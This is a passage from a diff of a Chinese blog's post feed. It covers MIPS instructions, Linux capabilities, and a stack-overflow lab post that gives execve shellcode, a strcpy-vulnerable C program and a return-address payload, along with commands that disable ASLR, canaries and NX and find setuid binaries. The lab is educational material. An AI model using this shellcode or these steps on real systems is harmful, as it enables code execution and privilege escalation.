+<h3 id="3-实现指令集"><a href="#3-实现指令集" class="headerlink" title="(3)实现指令集"></a>(3)实现指令集</h3><p>MIPS指令系统结构有MIPS-32和MIPS-64两种。本实验的MIPS指令选用MIPS-32。以下所说的MIPS指令均指MIPS-32。<br>MIPS的指令格式为32位。图3-3给出了MIPS指令的3种格式。</p>
+<p><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/1-3-3.png" alt=""><br>本实验只选取了18条典型的MIPS指令来描述CPU逻辑电路的设计方法。表3-1列出了本实验的所涉及到的18条MIPS指令。<br><img src="MIPS-CPU%E5%8D%95%E5%91%A8%E6%9C%9F%E8%AE%BE%E8%AE%A1/1-t-1.png" alt=""><br>Op和Op2为操作码；<br>shift保存要移位的位数；<br>rd、rs、rt分别为寄存器的寄存器号；<br>immediate保存立即数的低16位；<br>offset为偏移量；<br>address为转移地址的一部分。  </p>
+<p>1、对于add/sub/mul/and/or/xor  rd,rs,rt指令  //rdrs  op  rt<br>其中rs和rt是两个源操作数的寄存器号，rd是目的寄存器号。</p>
+<p>2、对于sll/srl/sra  rd,rt,shift 指令  //rdrt  移动  shift位</p>
+<p>3、对于addi/muli  rt,rs,imm 指令  //rtrs+imm(符号拓展)<br>rt是目的寄存器号，立即数要做符号拓展到32位。</p>
+<p>4、对于andi/ori/xori  rt,rs,imm 指令  //rtrs  op  imm(零拓展)<br>因为是逻辑指令，所以是零拓展。</p>
+<p>5、对于load  rt,offset(rs)  指令  //rt memory[rs+offset]<br>load是一条取存储器字的指令。寄存器rs的内容与符号拓展的offset想加，得到存储器地址。从存储器取来的数据存入rt寄存器。</p>
+<p>6、对于store  rt,offset(rs)  指令  // memory[rs+offset]  rt<br>store是一条存字指令。存储器地址的计算方法与load相同。</p>
+<p>7、对于beq  rs,rt,label指令  //if(rs==rt)  PClabel<br>beq是一条条件转移指令。当寄存器rs内容与rt相等时，转移到label。如果程序计数器PC是beq的指令地址，则label=PC+4+offset&lt;&lt;2。offset左移两位导致PC的最低两位永远是0，这是因为PC是字节地址，而一条指令要占4个字节。offset要进行符号拓展，因为beq能实现向前和向后两种转移。</p>
+<p>8、bne指令去beq类似，但是是在寄存器rs内容与rt不相等时，转移到label。</p>
+<p>9、对于jump  target指令  //PCtarget<br>jump是一条跳转指令。target是转移的目标地址，32位，由3部分组成：最高4位来自于PC+4的高4位，中间26位是指令中的address，最低两位为0。</p>
+<p>—————————————————————        未完待续—————————————————————————–</p>
+]]></content>
+      <categories>
+        <category>CPU</category>
+      </categories>
+      <tags>
+        <tag>MIPS</tag>
+        <tag>CPU</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础栈溢出</title>
+    <url>/2018/05/01/%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul>
+<li>理解掌握<code>C</code> 栈帧结构</li>
+<li><code>Shellcode</code> 构造</li>
+<li>加深理解栈溢出攻击原理及防护措施</li>
+</ul>
+<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul>
+<li>在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击</li>
+<li>开启安全保护机制,运行一样的溢出攻击代码,比较实现现象</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>​      <code>C</code> 栈帧结构如下：</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p>
+<p>​         因此当当前帧的局部变量和临时变量超出区域，覆盖了<code>ebp</code> 和返回地址时，就实现了栈溢出攻击。再通过精心设计返回地址，使其为<code>Shellcode</code> 的起始地址，就完成了运行流的劫持。</p>
+<p>​      实例基于 64位 <code>Ubuntu \ 16.04</code> 操作系统版本以及 <code>gcc,gdb</code> 版本信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609</span><br><span class="line"></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>Shellcode</code>  代码</li>
+</ul>
+<p>​       <code>Shellcode</code> 是一段攻击者精心设计的恶意代码，通常要求与位置无关，且本实验中利用 <code>strcpy()</code> 函数，因此<code>Shellcode</code>  代码中不能出现  <code>\x00</code> ，会被当作<code>\0</code>从而结束拷贝。</p>
+<p>​       编写<code>Shellcode</code> ，该<code>shellcode</code> 调用<code>execve(&quot;/bin/sh&quot;,NULL)</code> ，启动一个新的<code>shell</code>，验证其功能，参考: <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a> ，编写汇编文件如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    # char *const argv[]</span><br><span class="line">    xorl %esi, %esi</span><br><span class="line"> </span><br><span class="line">    # &#39;h&#39; &#39;s&#39; &#39;&#x2F;&#39; &#39;&#x2F;&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;&#x2F;&#39;</span><br><span class="line">    movq &#96;0x68732f2f6e69622f, %rbx</span><br><span class="line"> </span><br><span class="line">    # for &#39;\x00&#39;</span><br><span class="line">    pushq %rsi</span><br><span class="line">    pushq %rbx</span><br><span class="line">    pushq %rsp</span><br><span class="line">    </span><br><span class="line">    # const char *filename</span><br><span class="line">    popq %rdi</span><br><span class="line"> </span><br><span class="line">    # __NR_execve 59</span><br><span class="line">    pushq &#96;59</span><br><span class="line">    popq %rax</span><br><span class="line"> </span><br><span class="line">    # char *const envp[]</span><br><span class="line">    xorl %edx, %edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p>
+<p>   提取机器码：</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p>
+<ul>
+<li>漏洞代码</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">60</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"</span></span><br><span class="line">                  <span class="string">"\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span>;</span><br><span class="line">    <span class="built_in">overflow</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​       上面这段程序栈溢出漏洞触发点在<code>strcpy</code>函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址。因此在<code>gdb</code>调试时确定<code>shellcode</code>的地址即<code>str</code>复制后<code>buf</code>的首地址，让返回地址指向该地址。</p>
+<ul>
+<li>结果</li>
+</ul>
+<p>​  为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
+<ul>
+<li><p><code>ASLR</code> (地址空间布局随机化)</p>
+<p>关闭<code>ASLR</code>：<code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></p>
+</li>
+<li><p><code>Cannary</code>  金丝雀</p>
+<p>开启<code>Canary</code>之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 <code>_stackchk_fail</code>函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</p>
+</li>
+<li><p><code>NX</code><br>开启<code>NX</code>保护之后，程序的堆栈将会不可执行。对应GCC编译选项<code>-z execstack</code>解除该保护。    </p>
+</li>
+</ul>
+<p>编译调试：</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p>
+<p>​       从调试结果可知，<code>buf</code> 的首地址为 <code>0x7fffffffdaa0</code> ，且查看内存该地址处确实为 <code>Shellcode</code> 起始代码。为了覆盖到返回地址，即填充字节至且包括8字节<code>rbp</code> (<code>0x7fffffffdac0</code>) ，则除了<code>shellcode</code>外还需要填充17字节。另外返回地址为<code>0x7fffffffdaa0</code>,改为小端模式<code>\xa0\xda\xff\xff\xff\x7f</code>。因此：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">60</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span></span><br><span class="line">              <span class="string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">              <span class="string">"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"</span></span><br><span class="line">              <span class="string">"\xa0\xda\xff\xff\xff\x7f\x00\x00"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​     重新编译，gdb调试运行：</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p>
+<p> 成功运行。然而实际运行却是段错误，原因是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
+<p>获取<code>shellcode</code> 实际地址，可以打印出<code>buf</code> 地址，也可以利用内核转储获取真实地址。首先启用内核转储 <code>ulimit -c unlimited</code>  ，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p>
+<p>因此修改<code>str</code> 尾部为<code>\x10\xdb\xff\xff\xff\x7f\x00\x00</code>。重新编译运行：</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p>
+<p>若启用保护措施，正常编译：</p>
+<p><img src="%E5%9F%BA%E7%A1%80%E6%A0%88%E6%BA%A2%E5%87%BA/%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux 权能机制</title>
+    <url>/2018/05/01/Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<ol>
+<li><p><code>passwd​</code> ，  <code>sudo​</code> ， <code>ping​</code>  等命令会修改关键文件，确保非<code>root​</code> 用户无法修改，因此需要转换为<code>root​</code> 用户，而<code>setuid​</code> 位可以让用户暂时获得文件拥有者<code>root​</code> 的身份。</p>
+<p>以<code>ping</code> 命令为例，删除<code>s</code> 位后无法<code>ping</code> ，因为没有打开<code>socket</code> 的权限。而当将<code>s</code> 位重新设置时，又可以<code>ping</code>  ：</p>
+<a id="more"></a>
+
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/setuid-ping.png" alt="选区_047"></p>
+<p>为了执行权限检查，传统的 UNIX 实现区分两种类型的进程：特权进程（其有效用户 ID 为0，称为超级用户或 root），和非特权用户（其有效 UID 非0）。特权进程绕过所有的内核权限检查，而非特权进程受基于进程的认证信息（通常是：有效 UID，有效 GID，和补充组列表）的完整权限检查的支配。</p>
+<p>自内核 2.2 版本开始，Linux 将传统上与超级用户关联的特权分为几个单元，称为 capabilities （权能），它们可以被独立的启用或禁用。权能是每个线程的属性。权能相当于规范了你这个程序所拥有的权限。相当于特权的需求的细化。当执行特权操作的时候，可以查看是否有相应的权能。</p>
+<p><code>ping</code> 命令需要<code>CAP_NET_RAW</code>的权能，使用<code>setcap</code>为其添加权能：</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_051.png" alt="选区_050"></p>
+<p>可以<code>ping</code> ，且没有设置<code>uid</code> 位。</p>
+</li>
+<li><p>使用<code>man capabilities</code>  可以查看权能列表及相应的解释：</p>
+</li>
+</ol>
+<ul>
+<li><p><strong>CAP_AUDIT_CONTROL</strong>（自 Linux 2.6.11）<br>启用和禁用内核审计；修改审计过滤器规则；提取审计状态和过滤规则。</p>
+</li>
+<li><p><strong>CAP_AUDIT_READ</strong>（自 Linux 3.16）<br>允许通过一个多播 netlink socket 读取审计日志。</p>
+</li>
+<li><p><strong>CAP_AUDIT_WRITE</strong>（自 Linux 2.6.11）<br>向内核审计日志写记录。</p>
+</li>
+<li><p><strong>CAP_BLOCK_SUSPEND</strong>（自 Linux 3.5）<br>可以阻塞系统挂起（<strong>epoll</strong>(7) <strong>EPOLLWAKEUP</strong>，<em>/proc/sys/wake_lock</em>）的特性。</p>
+</li>
+<li><p><strong>CAP_CHOWN</strong><br>对文件的 UIDs 和 GIDs 做任意的修改（参考 <strong>chown</strong>(2)）。</p>
+</li>
+<li><p><strong>CAP_DAC_OVERRIDE</strong><br>绕过文件的读，写，和执行权限检查。（DAC 是 “discretionary access control” 的缩写。）</p>
+</li>
+<li><p>CAP_DAC_READ_SEARCH</p>
+<ul>
+<li>绕过文件的读权限检查和目录的读和执行权限检查；</li>
+<li>调用 <strong>open_by_handle_at</strong>(2)。</li>
+</ul>
+</li>
+<li><p>CAP_FOWNER</p>
+<ul>
+<li>对于通常要求进程的文件系统 UID 与文件的 UID 匹配的操作，绕过权限检查 (比如，<strong>chmod</strong>(2)，<strong>utime</strong>(2))，除了那些包含在 <strong>CAP_DAC_OVERRIDE</strong> 和 <strong>CAP_DAC_READ_SEARCH</strong> 中的操作；</li>
+<li>为任意文件设置扩展文件属性(参考 <strong>chattr</strong>(1))；</li>
+<li>为任意文件设置访问控制表(ACLs)；</li>
+<li>对文件删除操作忽略目录的 sticky 位；</li>
+<li>在 <strong>open</strong>(2) 和 <strong>fcntl</strong>(2) 任意文件时设置 <strong>O_NOATIME</strong>。</li>
+</ul>
+</li>
+<li><p><strong>CAP_FSETID</strong><br>当文件修改时不清除 set-user-ID 和 set-group-ID 模式位；为文件 GID 与调用进程的文件系统或补充 GIDs 不匹配的文件设置 set-group-ID 位。</p>
+</li>
+<li><p><strong>CAP_IPC_LOCK</strong><br>锁定内存 (<strong>mlock</strong>(2)，<strong>mlockall</strong>(2)，<strong>mmap</strong>(2)，<strong>shmctl</strong>(2))。</p>
+</li>
+<li><p><strong>CAP_IPC_OWNER</strong><br>绕过对 System V IPC 对象的操作的权限检查。</p>
+</li>
+<li><p><strong>CAP_KILL</strong><br>绕过发送信号 (参考 <strong>kill</strong>(2)) 时的权限检查。这包括使用 <strong>ioctl</strong>(2) <strong>KDSIGACCEPT</strong> 操作。</p>
+</li>
+<li><p><strong>CAP_LEASE</strong>（自 Linux 2.4）<br>为任意文件建立租约 (参考 <strong>fcntl</strong>(2))。</p>
+</li>
+<li><p><strong>CAP_LINUX_IMMUTABLE</strong><br>设置<strong>FS_APPEND_FL</strong> 和 <strong>FS_IMMUTABLE_FL</strong> inode 标记 (参考 <strong>chattr</strong>(1))。</p>
+</li>
+<li><p><strong>CAP_MAC_ADMIN</strong>（自 Linux 2.6.25）<br>覆盖强制访问控制 (Mandatory Access Control (MAC)). 为 Smack Linux 安全模块(Linux Security Module (LSM)) 而实现。</p>
+</li>
+<li><p><strong>CAP_MAC_OVERRIDE</strong>（自 Linux 2.6.25）<br>允许 MAC 配置或状态改变。为 Smack LSM 而实现。</p>
+</li>
+<li><p><strong>CAP_MKNOD</strong>（自 Linux 2.4）<br>使用 <strong>mknod</strong>(2) 创建特殊文件。</p>
+</li>
+<li><p>CAP_NET_ADMIN</p>
+<p>执行多种网络有关的操作：</p>
+<ul>
+<li>接口配置；</li>
+<li>IP 防火墙，地址伪装，和账单管理；</li>
+<li>修改路由表；</li>
+<li>为透明代理绑定任何地址；</li>
+<li>设置服务类性 (type-of-service (TOS))；</li>
+<li>清理驱动统计资料；</li>
+<li>设置混杂模式；</li>
+<li>启用组播；</li>
+<li>使用 <strong>setsockopt</strong>(2) 设置下列 socket 选项：<strong>SO_DEBUG</strong>，<strong>SO_MARK</strong>，<strong>SO_PRIORITY</strong> (在0到6范围之外的优先级)，<strong>SO_RCVBUFFORCE</strong>，和 <strong>SO_SNDBUFFORCE</strong>。</li>
+</ul>
+</li>
+<li><p><strong>CAP_NET_BIND_SERVICE</strong><br>将一个 socket 绑定到一个互联网域特权端口 (端口号小于 1024)。</p>
+</li>
+<li><p><strong>CAP_NET_BROADCAST</strong><br>(未使用) 使 socket 发送组播，并监听组播。</p>
+</li>
+<li><p>CAP_NET_RAW</p>
+<ul>
+<li>使用 RAW 和 PACKET sockets；</li>
+<li>为透明代理绑定任何地址。</li>
+</ul>
+</li>
+<li><p><strong>CAP_SETGID</strong><br>执行任意的进程 GIDs 和补充 GID 列表管理；当通过 UNIX 域 sockets 传递 socket 认证信息时伪造 GID；在一个用户命名空间 (参考 <strong>user_namespaces</strong>(7)) 中写入组 ID 映射。</p>
+</li>
+<li><p>CAP_SETFCAP (since Linux 2.6.24)<br>设置文件的权能。</p>
+</li>
+<li><p>CAP_SETPCAP</p>
+<p>如果文件权能不受支持：授予或删除调用者功能设置位或来自任何其他进程的任何权能。 （当内核配置为支持文件功能时，CAP_SETPCAP的此属性不可用，因为CAP_SETPCAP对于这样的内核具有完全不同的语义。）</p>
+<p>如果支持文件权能：从调用线程的边界集中添加任意权能到其可继承位;从边界集中删除权能（通过prctl（2）PR_CAPBSET_DROP）;</p>
+<pre><code>对securebits标志进行更改。</code></pre></li>
+<li><p>CAP_SETUID</p>
+</li>
+</ul>
+<ul>
+<li><p>CAP_SYS_ADMIN</p>
+<ul>
+<li>执行一系列系统管理操作，包括：<strong>quotactl</strong>(2)，<strong>mount</strong>(2)，<strong>umount</strong>(2)，<strong>swapon</strong>(2)，<strong>swapoff</strong>(2)，<strong>sethostname</strong>(2)，和 <strong>setdomainname</strong>(2)；</li>
+<li>执行特权 syslog(2) 操作 (自 Linux 2.6.37 开始，应该使用 CAP_SYSLOG 来允许这一操作)；</li>
+<li>执行 <strong>VM86_REQUEST_IRQ vm86</strong>(2) 命令；</li>
+<li>对任意 System V IPC 对象执行 IPC_SET 和 IPC_RMID 操作；</li>
+<li>覆盖 RLIMIT_NPROC 资源限制；</li>
+<li>执行 trusted 和 security Extended Attributes (see <strong>xattr</strong>(7)) 操作；</li>
+<li>使用 <strong>lookup_dcookie</strong>(2)；</li>
+<li>使用 ioprio_set(2) 来分配 IOPRIO_CLASS_RT 和 (Linux 2.6.25 之前) IOPRIO_CLASS_IDLE I/O 调度类别；</li>
+<li>当通过 UNIX 域 sockets 传递 socket 认证信息时伪装 PID；</li>
+<li>在系统调用打开文件 (比如，<strong>accept</strong>(2)，<strong>execve</strong>(2)，<strong>open</strong>(2)，<strong>pipe</strong>(2)) 时，超出 /proc/sys/fs/file-max，系统范围内打开文件数的限制；</li>
+<li>通过 <strong>clone</strong>(2) 和 <strong>unshare</strong>(2) 使用 <strong>CLONE_*</strong> 标记创建新的命名空间（但是，自从 Linux 3.8 开始，创建命名空间不需要任何权能）；</li>
+<li>调用 <strong>perf_event_open</strong>(2)；</li>
+<li>访问特权 perf 事件信息；</li>
+<li>调用 <strong>setns</strong>(2) (在目标命名空间中需要 CAP_SYS_ADMIN)；</li>
+<li>调用 <strong>fanotify_init</strong>(2)；</li>
+<li>调用 <strong>bpf</strong>(2)；</li>
+<li>执行 <strong>KEYCTL_CHOWN</strong> 和 <strong>KEYCTL_SETPERM keyctl</strong>(2) 操作；</li>
+<li>执行 <strong>madvise</strong>(2) <strong>MADV_HWPOISON</strong> 操作；</li>
+<li>使用 <strong>TIOCSTI ioctl</strong>(2) 向一个终端的输入队列中插入字符，而不是调用者的控制终端；</li>
+<li>使用废弃的 <strong>nfsservctl</strong> (2) 系统调用；</li>
+<li>使用废弃的 <strong>bdflush</strong> (2) 系统调用；</li>
+<li>执行各种特权的块设备 <strong>ioctl</strong>(2) 操作；</li>
+<li>执行各种特权的文件系统 <strong>ioctl</strong>(2) 操作；</li>
+<li>对许多设备驱动执行管理操作。</li>
+</ul>
+</li>
+<li><p><strong>CAP_SYS_BOOT</strong><br>使用 <strong>reboot</strong>(2) 和 <strong>kexec_load</strong>(2)。</p>
+</li>
+<li><p><strong>CAP_SYS_CHROOT</strong><br>使用 <strong>chroot</strong>(2)。</p>
+</li>
+<li><p><strong>CAP_SYS_MODULE</strong><br>加载和卸载内核模块(参考 <strong>init_module</strong>(2) 和 <strong>delete_module</strong>(2))；在 2.6.25 之前的内核中：从系统范围内的权能边界集合中丢弃权能。</p>
+</li>
+<li><p>CAP_SYS_NICE</p>
+<ul>
+<li>触发进程 nice 值 (<strong>nice</strong>(2)，<strong>setpriority</strong>(2)) 和为任意进程改变 nice 值；</li>
+<li>为调用进程设置实时调度策略，及为任意进程设置调度策略和优先级 (<strong>sched_setscheduler</strong>(2)，<strong>sched_setparam</strong>(2)，<strong>shed_setattr</strong>(2))；</li>
+<li>为任意进程设置 CPU affinity (<strong>sched_setaffinity</strong>(2))；</li>
+<li>为任意进程设置 I/O 调度类别和优先级 (<strong>ioprio_set</strong>(2))；</li>
+<li>对任意进程应用 <strong>migrate_pages</strong>(2) 并允许进程被迁移到任意节点；</li>
+<li>对任意进程应用 <strong>move_pages</strong>(2)；</li>
+<li>在 <strong>mbind</strong>(2) 和 <strong>move_pages</strong>(2) 中使用 <strong>MPOL_MF_MOVE_ALL</strong> 标记。</li>
+</ul>
+</li>
+<li><p><strong>CAP_SYS_PACCT</strong><br>使用 <strong>acct</strong>(2)。</p>
+</li>
+<li><p>CAP_SYS_PTRACE</p>
+<ul>
+<li>使用 <strong>ptrace</strong>(2) 追踪任意进程；</li>
+<li>对任意进程应用 <strong>get_robust_list</strong>(2)；</li>
+<li>使用 <strong>process_vm_readv</strong>(2) 和 <strong>process_vm_writev</strong>(2) 同任意进程的内存传输数据；</li>
+<li>使用 <strong>kcmp</strong>(2) 检查进程。</li>
+</ul>
+</li>
+<li><p>CAP_SYS_RAWIO</p>
+<ul>
+<li>执行 I/O 端口操作 (<strong>iopl</strong>(2) 和 <strong>ioperm</strong>(2))；</li>
+<li>访问 /proc/kcore；</li>
+<li>使用 <strong>FIBMAP ioctl</strong>(2) 操作；</li>
+<li>打开设备访问 x86 模式特有寄存器 (MSRs，参考 <strong>msr</strong>(4))；</li>
+<li>更新 /proc/sys/vm/mmap_min_addr；</li>
+<li>在地址低于 /proc/sys/vm/mmap_min_addr 的位置创建内存映射；</li>
+<li>在 /proc/bus/pci 中映射文件；</li>
+<li>打开 /dev/mem 和 /dev/kmem；</li>
+<li>执行各种 SCSI 设备命令；</li>
+<li>在 <strong>hpsa</strong>(4) 和 <strong>cciss</strong>(4) 设备上执行某一操作；</li>
+<li>在其它设备上执行一系列设备特有操作。</li>
+</ul>
+</li>
+<li><p>CAP_SYS_RESOURCE</p>
+<ul>
+<li>使用 ext2 文件系统上的预留空间；</li>
+<li>执行 ioctl(2) 调用控制 ext3 日志；</li>
+<li>覆盖磁盘配额限制；</li>
+<li>增加资源限制 (参考 <strong>setrlimit</strong>(2))；</li>
+<li>覆盖 RLIMIT_NPROC 资源限制；</li>
+<li>在终端分配上覆盖最大的终端数；</li>
+<li>覆盖最大的 keymaps 个数；</li>
+<li>允许实时时钟中断大于64 hz；</li>
+<li>触发一个 System V 消息队列的 msg_qbytes 限制超过 /proc/sys/kernel/msgmnb 中的限制 (参考 <strong>msgop</strong>(2) 和 <strong>msgctl</strong>(2))；</li>
+<li>当使用 <strong>F_SETPIPE_SZ fcntl</strong>(2) 命令设置一个管道的容量时覆盖 /proc/sys/fs/pipe-size-max 的限制；</li>
+<li>使用 <strong>F_SETPIPE_SZ</strong> 增加管道的容量超出 /proc/sys/fs/pipe-max-size 指定的限制；</li>
+<li>当创建 POSIX 消息队列 (参考 <strong>mq_overview</strong>(7)) 时覆盖 /proc/sys/fs/mqueue/queues_max 的限制；</li>
+<li>使用 <strong>prctl</strong>(2) <strong>PR_SET_MM</strong> 操作；</li>
+<li>设置 /proc/PID/oom_score_adj 为一个小于由一个具有 CAP_SYS_RESOURCE 的进程最近设置的值的值。</li>
+</ul>
+</li>
+<li><p><strong>CAP_SYS_TIME</strong><br>设置系统时钟 (<strong>settimeofday</strong>(2)，<strong>stime</strong>(2)，<strong>adjtimex</strong>(2))；设置实时 (硬件) 时钟。</p>
+</li>
+<li><p><strong>CAP_SYS_TTY_CONFIG</strong><br>使用 <strong>vhangup</strong>(2)；对虚拟终端使用各种特权 <strong>ioctl</strong>(2) 操作。</p>
+</li>
+<li><p>CAP_SYSLOG</p>
+<p>(自 Linux 2.6.37)</p>
+<ul>
+<li>执行特权 <strong>syslog</strong>(2) 操作。参考 <strong>syslog</strong>(2) 来获取哪些操作需要特权的信息；</li>
+<li>当 /proc/sys/kernel/kptr_restrict 值为 1 时，查看通过 /proc 和其它接口暴露<br>的内核地址。(参考 <strong>proc</strong>(5) 中 kptr_restrict 的讨论。)</li>
+</ul>
+</li>
+<li><p><strong>CAP_WAKE_ALARM</strong> (自 Linux 3.0)<br>触发将唤醒系统的东西 (设置 CLOCK_REALTIME_ALARM 和 CLOCK_BOOTTIME_ALARM 定时器)</p>
+</li>
+</ul>
+<ol>
+<li>找出所有设置<code>uid</code> 位程序，使用以下命令：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm &#x2F;u&#x3D;s</span><br><span class="line">find &#x2F; -perm -4000</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_048.png" alt="选区_048"></p>
+<p><img src="Linux-%E6%9D%83%E8%83%BD%E6%9C%BA%E5%88%B6/%E9%80%89%E5%8C%BA_049.png" alt="选区_049"></p>
+<p>部分需要的权能如下：</p>
+<table>
+<thead>
+<tr>
+<th>程序</th>
+<th>需要的权能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/bin/ping</td>
+<td>CAP_NET_RAW</td>
+</tr>
+<tr>
+<td>/bin/mount</td>
+<td>CAP_SYS_ADMIN</td>
+</tr>
+<tr>
+<td>/bin/su</td>
+<td>CAP_DAC_OVERRIDE,CAP_SETGID,CAP_SETUID</td>
+</tr>
+<tr>
+<td>/bin/fusermount</td>
+<td>CAP_SYS_ADMIN</td>
+</tr>
+<tr>
+<td>/bin/umount</td>
+<td>CAP_SYS_ADMIN</td>
+</tr>
+<tr>
+<td>/usr/bin/passwd</td>
+<td>CAP_CHOWN ,CAP_DAC_OVERRIDE ,CAP_FOWNER</td>
+</tr>
+</tbody></table>
+<ol>
+<li><p>在linux中，文件权能有如下三种：</p>
+<ul>
+<li>effective：当前有效的权能，执行某特权操作时，操作系统检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。</li>
+<li>permitted：当前进程所有能使用的能力，effective包含于permitted</li>
+<li>inheritable：可以被继承的能力</li>
+</ul>
+<p>linux程序调用子程序，权能变换公式如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P’(ambient) = (file is privileged) ? 0 : P(ambient)</span><br><span class="line">P<span class="string">'(permitted) = (P(inheritable) &amp; F(inheritable)) | (F(permitted) &amp; cap_bset)| P’(ambient)</span></span><br><span class="line">P'(effective) = F(effective) ? P'(permitted) : P’(ambient)</span><br><span class="line">P<span class="string">'(inheritable) = P(inheritable) [i.e., unchanged]</span></span><br></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<ul>
+<li>P denotes the value of a thread capability set before the execve(2)</li>
+<li>P’ denotes the value of a capability set after the execve(2)</li>
+<li>F denotes a file capability set</li>
+<li>cap_bset is the value of the capability bounding set (described below).</li>
+</ul>
+<p>A privileged file is one that has capabilities or has the set-user-ID or set-group-ID bit set.</p>
+</li>
+</ol>
+<p>实现一个程序其满足以下的功能：</p>
+<ul>
+<li>能够永久的删除其子进程的某个权能。</li>
+<li>能暂时性的删除其子进程的某个权能。</li>
+<li>能让上面被暂时性删除的权能重新获得</li>
+</ul>
+<p>以ping为例，我们知道ping需要的权能为cap_net_raw，为了能在execve后执行ping，即execve中的ping有cap_net_raw权能，根据上面的变换规则：</p>
+<ul>
